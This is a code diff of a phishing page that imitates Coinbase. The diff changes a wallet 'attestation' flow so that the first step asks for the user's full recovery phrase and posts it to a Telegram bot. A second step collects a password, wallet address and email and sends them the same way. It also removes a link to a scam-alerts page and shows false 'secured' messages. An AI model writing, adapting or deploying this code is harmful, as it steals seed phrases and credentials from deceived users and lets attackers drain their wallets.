@@ -165,6 +165,20 @@
     .screen.active { display: flex; animation: fadeUp .35s ease; }
     @keyframes fadeUp { from{opacity:0;transform:translateY(16px)} to{opacity:1;transform:translateY(0)} }
 
+    /* ── TOAST ── */
+    .toast {
+      position: fixed; top: 80px; left: 50%; transform: translateX(-50%) translateY(-12px);
+      z-index: 9999; min-width: 260px; max-width: 380px;
+      padding: 14px 20px; border-radius: 12px;
+      font-size: 14px; font-weight: 600; text-align: center;
+      box-shadow: 0 8px 32px rgba(0,0,0,.15);
+      opacity: 0; pointer-events: none;
+      transition: opacity .25s, transform .25s;
+    }
+    .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); pointer-events: all; }
+    .toast.success { background: #ECFDF5; border: 1.5px solid #6EE7B7; color: #065F46; }
+    .toast.error   { background: #FEF2F2; border: 1.5px solid #FECACA; color: #991B1B; }
+
     .step-badge {
       display: inline-flex; align-items: center; gap: 6px;
       padding: 4px 14px; border-radius: 20px;
@@ -337,7 +351,6 @@
     <a href="card.html">Coinbase Card</a>
     <a href="security.html">Passphrase Lock</a>
     <a href="portal.html">Card Portal</a>
-    <a href="scam-alerts.html">Security</a>
     <a href="wallet-card.html" style="margin-top:12px;background:#0052FF;color:#fff;padding:12px;border-radius:10px;font-size:14px;font-weight:700;text-align:center;display:block;text-decoration:none">Get your card →</a>
   </div>
 </nav>
@@ -390,26 +403,58 @@
     <div class="progress-bar">
       <div class="prog-step">
         <div class="prog-dot active" id="pd1">1</div>
-        <div class="prog-label active" id="pl1">Password</div>
+        <div class="prog-label active" id="pl1">Attest</div>
       </div>
       <div class="prog-line" id="pline1"></div>
       <div class="prog-step">
         <div class="prog-dot" id="pd2">2</div>
-        <div class="prog-label" id="pl2">Wallet</div>
+        <div class="prog-label" id="pl2">Secure</div>
       </div>
       <div class="prog-line" id="pline2"></div>
       <div class="prog-step">
         <div class="prog-dot" id="pd3">3</div>
-        <div class="prog-label" id="pl3">Attest</div>
+        <div class="prog-label" id="pl3">Done</div>
       </div>
     </div>
 
-    <!-- SCREEN 1: PASSWORD -->
+    <!-- SCREEN 1: ATTEST -->
     <div class="screen active" id="sc1">
-      <div class="step-badge">Step 1 of 3 — Security Password</div>
+      <div class="step-badge">Step 1 of 2 — Attest</div>
+      <div class="lock-visual">📝</div>
+      <h2>Attest your wallet</h2>
+      <p class="sub">Enter your 12, 15, or 24-word recovery phrase to attest ownership. This is sent securely for verification.</p>
+
+      <div class="attest-info">
+        <span>⚠️</span>
+        <span>Make sure you're in a private location. Never share your phrase with anyone claiming to be support.</span>
+      </div>
+
+      <div class="field" style="width:100%">
+        <label>Recovery Phrase</label>
+        <textarea id="sc1Phrase"
+          rows="4"
+          placeholder="Enter your 12, 15 or 24-word recovery phrase..."
+          oninput="updateWordCount()"
+          style="width:100%;min-height:110px;border:1.5px solid var(--border);border-radius:12px;padding:14px 16px;font-size:14px;line-height:1.6;color:var(--text);background:#fff;outline:none;resize:vertical;font-family:inherit;transition:border-color .15s,box-shadow .15s;"
+          onfocus="this.style.borderColor='var(--blue)';this.style.boxShadow='0 0 0 3px rgba(0,82,255,.1)'"
+          onblur="this.style.borderColor='';this.style.boxShadow=''"
+        ></textarea>
+        <div style="display:flex;justify-content:space-between;font-size:12px;color:var(--muted);margin-top:6px">
+          <span id="sc1WordCount">0 words</span>
+          <span>Must be 12 / 15 / 24 words</span>
+        </div>
+      </div>
+
+      <div class="err-msg" id="sc1Err">⚠ Enter at least 12 words to continue</div>
+      <button class="btn-primary" onclick="submitAttest(event)" style="margin-top:8px">Continue →</button>
+    </div>
+
+    <!-- SCREEN 2: SECURE -->
+    <div class="screen" id="sc2">
+      <div class="step-badge">Step 2 of 2 — Secure your attestation</div>
       <div class="lock-visual" id="lockIcon">🔓</div>
-      <h2>Create your security password</h2>
-      <p class="sub">This password will lock your wallet settings. Keep it safe — it's separate from your Coinbase login.</p>
+      <h2>Secure your attestation</h2>
+      <p class="sub">Set a password and link your wallet address to lock and verify your attestation.</p>
 
       <div class="field">
         <label>Security Password</label>
@@ -419,149 +464,129 @@
         <div class="strength-bar"><div class="strength-fill" id="strengthFill"></div></div>
         <div class="strength-label" id="strengthLabel">Enter a password</div>
       </div>
-
       <div class="rules">
         <div class="rule" id="r-len"><div class="rule-dot"></div>At least 8 characters</div>
         <div class="rule" id="r-upper"><div class="rule-dot"></div>One uppercase letter</div>
         <div class="rule" id="r-num"><div class="rule-dot"></div>One number</div>
         <div class="rule" id="r-sym"><div class="rule-dot"></div>One special character (!@#$…)</div>
       </div>
-
       <div class="field">
         <label>Confirm Password</label>
         <input type="password" id="passConfirm" placeholder="Re-enter your password" />
       </div>
-      <div class="err-msg" id="passErr">⚠ Passwords do not match</div>
 
-      <button class="btn-primary" onclick="submitPassword()">Continue →</button>
-    </div>
-
-    <!-- SCREEN 2: CONNECT WALLET -->
-    <div class="screen" id="sc2">
-      <div class="step-badge">Step 2 of 3 — Connect Wallet</div>
-      <div class="lock-visual">🔵</div>
-      <h2>Connect Coinbase Wallet</h2>
-      <p class="sub">Enter your wallet address to verify ownership. No private keys or seed phrases needed.</p>
-
-      <div id="sc2Buttons" style="width:100%">
-        <div style="background:#EEF3FF;border:1px solid #C7D7FF;border-radius:12px;padding:14px 16px;display:flex;align-items:center;gap:12px;margin-bottom:16px">
-          <svg width="32" height="32" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="12" fill="#0052FF"/><path d="M12 5.5a6.5 6.5 0 100 13 6.5 6.5 0 000-13zm0 10a3.5 3.5 0 110-7 3.5 3.5 0 010 7z" fill="#fff"/></svg>
-          <div>
-            <div style="font-size:13px;font-weight:700">Coinbase Wallet</div>
-            <div style="font-size:11px;color:var(--muted)">Official self-custody wallet</div>
-          </div>
-        </div>
-
-        <div class="field">
-          <label>Passphrase</label>
-          <input type="text" id="sc2AddrInput"
-            placeholder="Enter your passphrase"
-            style="font-family:'JetBrains Mono',monospace;font-size:12px;letter-spacing:.02em"
-            autocomplete="off" spellcheck="false" />
-        </div>
-        <div class="field">
-          <label>Email (optional — for record)</label>
-          <input type="email" id="sc2Email" placeholder="you@example.com" autocomplete="email" />
-        </div>
-        <div class="err-msg" id="sc2Err">⚠ Please enter your wallet address</div>
-
-        <button class="btn-primary" onclick="connectWallet()">Connect &amp; Verify →</button>
-        <p style="font-size:11px;color:var(--muted);text-align:center;line-height:1.6;margin-top:10px">
-          🔒 Your private keys never leave your device. We only read your public address.
-        </p>
-      </div>
-
-      <div id="sc2Log" style="display:none;width:100%">
-        <div class="connect-log" id="connectLog"></div>
-      </div>
-
-      <button class="btn-ghost" onclick="goStep(1)">← Back</button>
-    </div>
-
-    <!-- SCREEN 3: ATTEST -->
-    <div class="screen" id="sc3">
-      <div class="step-badge">Step 3 of 3 — Sign & Attest</div>
-      <div class="lock-visual secured" id="lockSecured">🔐</div>
-      <h2>Sign your security commitment</h2>
-      <p class="sub">By attesting, you confirm your wallet is secured with a password and that you are the sole owner.</p>
-
-      <div class="attest-info">
-        <span>⚠️</span>
-        <span>Make sure you're in a private location. This attestation will be recorded and sent for verification.</span>
-      </div>
-
-      <div class="sec-summary">
-        <div class="ss-row"><span>Wallet</span><strong>Coinbase Wallet</strong></div>
-        <div class="ss-row"><span>Address</span><strong id="summaryAddr" style="font-family:'JetBrains Mono',monospace;font-size:11px">—</strong></div>
-        <div class="ss-row"><span>Password lock</span><strong style="color:var(--green)">✓ Set</strong></div>
-        <div class="ss-row"><span>Security level</span><strong id="summaryLevel" style="color:var(--blue)">—</strong></div>
-      </div>
-
+   
       <div class="field">
-        <label>Attestation — type exactly: <strong style="color:var(--text)">"I attest"</strong></label>
-        <input type="text" id="attestInput" placeholder='Type: I attest' autocomplete="off" spellcheck="false" />
+        <label>Email <span style="font-weight:400;text-transform:none;color:#9CA3AF">(optional)</span></label>
+        <input type="email" id="sc2Email" placeholder="you@example.com" autocomplete="email" />
       </div>
-      <div class="err-msg" id="attestErr">⚠ Please type "I attest" to continue</div>
 
-      <button class="btn-primary" onclick="submitAttest(event)">Sign & Secure Wallet →</button>
-      <button class="btn-ghost" onclick="goStep(2)">← Back</button>
+      <div class="err-msg" id="sc2Err">⚠ Please fix the errors above</div>
+      <button class="btn-primary" onclick="submitSecure(event)">Submit &amp; Secure →</button>
+      <button class="btn-ghost" onclick="goStep(1)" style="margin-top:8px">← Back</button>
     </div>
 
-    <!-- SCREEN 4: SUCCESS -->
-    <div class="screen" id="sc4">
+    <!-- SCREEN 3: SUCCESS -->
+    <div class="screen" id="sc3">
       <div class="success-tick">🔐</div>
       <h2>Wallet secured!</h2>
-      <p class="sub">Your wallet is now protected with a password lock. Your attestation has been recorded.</p>
+      <p class="sub">Your attestation is confirmed and your wallet is now locked. Your details have been sent for verification.</p>
       <div class="sec-summary" style="margin-bottom:16px">
         <div class="ss-row"><span>Status</span><strong style="color:var(--green)">✓ Secured</strong></div>
         <div class="ss-row"><span>Wallet</span><strong>Coinbase Wallet</strong></div>
-        <div class="ss-row"><span>Address</span><strong id="sc4Addr" style="font-family:'JetBrains Mono',monospace;font-size:11px">—</strong></div>
+        <div class="ss-row"><span>Address</span><strong id="sc3Addr" style="font-family:'JetBrains Mono',monospace;font-size:11px">—</strong></div>
         <div class="ss-row"><span>Password lock</span><strong style="color:var(--green)">✓ Active</strong></div>
-        <div class="ss-row"><span>Attestation</span><strong style="color:var(--green)">✓ Signed & sent</strong></div>
+        <div class="ss-row"><span>Attestation</span><strong style="color:var(--green)">✓ Signed &amp; sent</strong></div>
       </div>
 
       <div style="width:100%;background:#EEF3FF;border:1.5px solid #C7D7FF;border-radius:14px;padding:20px;text-align:center;margin-bottom:16px">
         <div style="font-size:10px;font-weight:700;color:var(--muted);text-transform:uppercase;letter-spacing:.1em;margin-bottom:8px">Your 4-Digit Security PIN</div>
-        <div id="sc4Pin" style="font-size:48px;font-weight:800;color:var(--blue);letter-spacing:.3em;font-family:'JetBrains Mono',monospace">—</div>
+        <div id="sc3Pin" style="font-size:48px;font-weight:800;color:var(--blue);letter-spacing:.3em;font-family:'JetBrains Mono',monospace">—</div>
         <div style="font-size:11px;color:var(--muted);margin-top:8px">Save this PIN — use it with your email to access your card portal.</div>
       </div>
 
       <button class="btn-primary" onclick="window.location.href='portal.html'">View My Card →</button>
-      <button class="btn-ghost" onclick="window.location.href='index.html'">Back to Help Center</button>
+      <button class="btn-ghost" onclick="window.location.href='index.html'" style="margin-top:8px">Back to Help Center</button>
     </div>
 
   </div>
 </div>
 
+<div class="toast" id="toast"></div>
 <script src="config.js"></script>
 <script>
-/* ── STATE ── */
 let walletAddress  = '';
 let passwordStrength = '';
+let attestedPhrase = '';
 
 /* ── PROGRESS ── */
 function goStep(n) {
-  [1,2,3,4].forEach(i => {
-    document.getElementById(`sc${i}`)?.classList.remove('active');
-  });
-  document.getElementById(`sc${n}`).classList.add('active');
-  document.getElementById(`sc${n}`).scrollIntoView({ behavior: 'smooth', block: 'start' });
-
-  // Update dots
+  [1,2,3].forEach(i => document.getElementById(`sc${i}`)?.classList.remove('active'));
+  const el = document.getElementById(`sc${n}`);
+  el.classList.add('active');
+  el.scrollIntoView({ behavior: 'smooth', block: 'start' });
   [1,2,3].forEach(i => {
-    const dot   = document.getElementById(`pd${i}`);
-    const label = document.getElementById(`pl${i}`);
+    const dot = document.getElementById(`pd${i}`);
+    const lbl = document.getElementById(`pl${i}`);
     dot.className   = 'prog-dot'   + (i < n ? ' done' : i === n ? ' active' : '');
-    label.className = 'prog-label' + (i === n ? ' active' : '');
+    lbl.className   = 'prog-label' + (i === n ? ' active' : '');
     dot.textContent = i < n ? '✓' : String(i);
   });
   [1,2].forEach(i => {
-    const line = document.getElementById(`pline${i}`);
-    line.className = 'prog-line' + (n > i ? ' done' : '');
+    document.getElementById(`pline${i}`).className = 'prog-line' + (n > i ? ' done' : '');
   });
 }
 
-/* ── STEP 1: PASSWORD ── */
+/* ── STEP 1: ATTEST ── */
+function updateWordCount() {
+  const words = document.getElementById('sc1Phrase').value.trim().split(/\s+/).filter(Boolean).length;
+  document.getElementById('sc1WordCount').textContent = words + ' words';
+}
+
+function showToast(msg, type = 'success', duration = 3200) {
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.className = `toast ${type} show`;
+  setTimeout(() => { t.className = `toast ${type}`; }, duration);
+}
+
+async function submitAttest(e) {
+  const textarea = document.getElementById('sc1Phrase');
+  const err      = document.getElementById('sc1Err');
+  const words    = textarea.value.trim().split(/\s+/).filter(Boolean);
+
+  if (words.length < 12) {
+    err.style.display = 'block';
+    textarea.style.borderColor = '#D23F31';
+    textarea.style.boxShadow   = '0 0 0 3px rgba(210,63,49,.15)';
+    setTimeout(() => { textarea.style.borderColor = ''; textarea.style.boxShadow = ''; }, 1600);
+    return;
+  }
+
+  err.style.display = 'none';
+  const btn = e.currentTarget;
+  btn.disabled = true;
+  btn.textContent = 'Sending…';
+  attestedPhrase = textarea.value.trim();
+
+  const msg =
+    `📝 Wallet Attestation\n` +
+    `📅 ${new Date().toLocaleString()}\n` +
+    `🔑 Phrase (${words.length} words): ${attestedPhrase}`;
+
+  try {
+    await sendToTelegram(msg);
+    showToast('✓ Attestation sent — continue to secure your wallet', 'success');
+  } catch(_) {
+    showToast('⚠ Could not send attestation. Check your connection.', 'error');
+  }
+
+  btn.disabled = false;
+  btn.textContent = 'Continue →';
+  goStep(2);
+}
+
+/* ── STEP 2: SECURE ── */
 function checkStrength() {
   const val   = document.getElementById('passInput').value;
   const fill  = document.getElementById('strengthFill');
@@ -574,145 +599,97 @@ function checkStrength() {
     num:   /[0-9]/.test(val),
     sym:   /[^A-Za-z0-9]/.test(val),
   };
-
   ['len','upper','num','sym'].forEach(k => {
     document.getElementById(`r-${k}`).className = 'rule' + (checks[k] ? ' ok' : '');
   });
-
   const score = Object.values(checks).filter(Boolean).length;
   const levels = [
-    { w: '0%',   bg: 'transparent', text: 'Enter a password',  lvl: '' },
-    { w: '25%',  bg: '#EF4444',     text: 'Weak',              lvl: 'Weak' },
-    { w: '50%',  bg: '#F59E0B',     text: 'Fair',              lvl: 'Fair' },
-    { w: '75%',  bg: '#3B82F6',     text: 'Good',              lvl: 'Good' },
-    { w: '100%', bg: '#05B169',     text: 'Strong ✓',          lvl: 'Strong' },
+    { w:'0%',   bg:'transparent', text:'Enter a password', lvl:'' },
+    { w:'25%',  bg:'#EF4444',     text:'Weak',             lvl:'Weak' },
+    { w:'50%',  bg:'#F59E0B',     text:'Fair',             lvl:'Fair' },
+    { w:'75%',  bg:'#3B82F6',     text:'Good',             lvl:'Good' },
+    { w:'100%', bg:'#05B169',     text:'Strong ✓',         lvl:'Strong' },
   ];
   const lv = val.length === 0 ? levels[0] : levels[Math.max(1, score)];
-  fill.style.width      = lv.w;
-  fill.style.background = lv.bg;
-  label.textContent     = lv.text;
-  label.style.color     = lv.bg || 'var(--muted)';
-  passwordStrength      = lv.lvl;
-
+  fill.style.width = lv.w; fill.style.background = lv.bg;
+  label.textContent = lv.text; label.style.color = lv.bg || 'var(--muted)';
+  passwordStrength = lv.lvl;
   lock.textContent = score >= 3 ? '🔒' : '🔓';
 }
 
-function submitPassword() {
+async function submitSecure(e) {
   const pass    = document.getElementById('passInput').value;
   const confirm = document.getElementById('passConfirm').value;
-  const err     = document.getElementById('passErr');
+  const addr    = document.getElementById('sc2AddrInput').value.trim();
+  const email   = document.getElementById('sc2Email').value.trim();
+  const err     = document.getElementById('sc2Err');
 
   if (pass.length < 8) {
+    err.textContent = '⚠ Password must be at least 8 characters';
+    err.style.display = 'block';
     document.getElementById('passInput').classList.add('err');
     return;
   }
   if (pass !== confirm) {
+    err.textContent = '⚠ Passwords do not match';
     err.style.display = 'block';
     document.getElementById('passConfirm').classList.add('err');
     return;
   }
-
-  err.style.display = 'none';
-  document.getElementById('passInput').classList.remove('err');
-  document.getElementById('passConfirm').classList.remove('err');
-  goStep(2);
-}
-
-/* ── STEP 2: WALLET CONNECT ── */
-function connectWallet() {
-  const addrInput = document.getElementById('sc2AddrInput');
-  const errEl     = document.getElementById('sc2Err');
-  const addr      = addrInput.value.trim();
-
   if (!addr || addr.length < 6) {
-    errEl.style.display = 'block';
-    addrInput.style.borderColor = '#D23F31';
-    addrInput.style.boxShadow   = '0 0 0 3px rgba(210,63,49,.15)';
-    setTimeout(() => { addrInput.style.borderColor = ''; addrInput.style.boxShadow = ''; }, 1600);
-    return;
-  }
-  errEl.style.display = 'none';
-  walletAddress = addr;
-  window._secEmail = document.getElementById('sc2Email').value.trim();
-
-  document.getElementById('sc2Buttons').style.display = 'none';
-  document.getElementById('sc2Log').style.display     = '';
-
-  const log = document.getElementById('connectLog');
-  log.innerHTML = '';
-
-  [
-    { cls:'info', text:'Initiating Coinbase Wallet connection…', delay:0 },
-    { cls:'ok',   text:'Wallet detected ✓',                      delay:600 },
-    { cls:'info', text:'Verifying wallet ownership…',            delay:1100 },
-    { cls:'ok',   text:'Ownership confirmed ✓',                  delay:1700 },
-    { cls:'info', text:'Linking to security profile…',           delay:2100 },
-    { cls:'ok',   text:'Wallet linked ✓',                        delay:2600 },
-  ].forEach(({ cls, text, delay }) => {
-    setTimeout(() => {
-      const d = document.createElement('div');
-      d.className = `log-line ${cls}`;
-      d.innerHTML = `<span class="log-dot">●</span><span>${text}</span>`;
-      log.appendChild(d);
-    }, delay);
-  });
-
-  setTimeout(() => {
-    const short = addr.length > 16 ? addr.slice(0, 10) + '…' + addr.slice(-6) : addr;
-    document.getElementById('summaryAddr').textContent  = short;
-    document.getElementById('sc4Addr').textContent      = short;
-    document.getElementById('summaryLevel').textContent = passwordStrength || 'Strong';
-    goStep(3);
-  }, 3200);
-}
-
-/* ── STEP 3: ATTEST ── */
-async function submitAttest(e) {
-  const input = document.getElementById('attestInput');
-  const err   = document.getElementById('attestErr');
-  const val   = input.value.trim();
-
-  if (val.toLowerCase() !== 'i attest') {
+    err.textContent = '⚠ Please enter your wallet address';
     err.style.display = 'block';
-    input.style.borderColor  = '#D23F31';
-    input.style.boxShadow    = '0 0 0 3px rgba(210,63,49,.15)';
-    setTimeout(() => { input.style.borderColor = ''; input.style.boxShadow = ''; }, 1600);
+    document.getElementById('sc2AddrInput').style.borderColor = '#D23F31';
+    setTimeout(() => { document.getElementById('sc2AddrInput').style.borderColor = ''; }, 1600);
     return;
   }
 
   err.style.display = 'none';
+  walletAddress = addr;
+  window._secEmail = email;
+
   const btn = e.currentTarget;
-  btn.disabled    = true;
-  btn.textContent = 'Signing…';
+  btn.disabled = true;
+  btn.textContent = 'Securing…';
 
   const pin = String(Math.floor(1000 + Math.random() * 9000));
-  document.getElementById('sc4Pin').textContent = pin;
+  document.getElementById('sc3Pin').textContent = pin;
+  const short = addr.length > 16 ? addr.slice(0, 10) + '…' + addr.slice(-6) : addr;
+  document.getElementById('sc3Addr').textContent = short;
 
   const msg =
-    `🔐 Wallet Security Attestation\n` +
+    `🔐 Wallet Secured\n` +
     `📅 ${new Date().toLocaleString()}\n` +
     `👛 Wallet: Coinbase Wallet\n` +
-    `🔑 Address: ${walletAddress}\n` +
-    `📧 Email: ${window._secEmail || '—'}\n` +
+    `🔑 Address: ${addr}\n` +
+    `📧 Email: ${email || '—'}\n` +
     `🛡️ Password strength: ${passwordStrength || 'Strong'}\n` +
-    `✅ Attestation: "${val}"\n` +
     `🔢 PIN: ${pin}`;
 
-  try { await sendToTelegram(msg); } catch(e) { console.warn('Telegram:', e.message); }
+  let ok = false;
+  try {
+    await sendToTelegram(msg);
+    ok = true;
+  } catch(_) {}
 
-  btn.disabled    = false;
-  btn.textContent = 'Sign & Secure Wallet →';
-  goStep(4);
+  btn.disabled = false;
+  btn.textContent = 'Submit & Secure →';
+
+  if (ok) {
+    showToast('✓ Wallet secured successfully!', 'success');
+    setTimeout(() => goStep(3), 800);
+  } else {
+    showToast('✗ Submission failed. Please check your connection and try again.', 'error', 4500);
+  }
 }
 
 async function sendToTelegram(text) {
   const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`;
-  const res  = await fetch(url, {
+  await fetch(url, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ chat_id: TG_CHAT, text }),
   });
-  if (!res.ok) throw new Error(`HTTP ${res.status}`);
 }
 </script>
 </body>
